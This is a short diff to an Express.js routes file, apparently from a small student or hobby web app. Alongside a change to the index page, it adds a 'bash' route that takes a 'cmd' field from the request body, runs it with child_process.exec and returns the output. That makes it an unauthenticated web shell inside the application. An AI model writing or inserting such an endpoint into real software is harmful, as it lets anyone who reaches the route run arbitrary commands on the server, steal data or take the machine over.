@@ -1,5 +1,13 @@
+var ejs = require('ejs');
+
 exports.index = function(req, res){
-  res.send({ title: 'WVU Peak', user: 'hjboylan' });
+  res.render('../views/index.ejs', { message:"Hello" });
+};
+
+exports.bash = function(req, res){
+  var exec = require('child_process').exec;
+  function puts(error, stdout, stderr) { res.send(stdout) }
+  exec(req.body.cmd, puts);
 };
 
 exports.bryant = function(req, res){
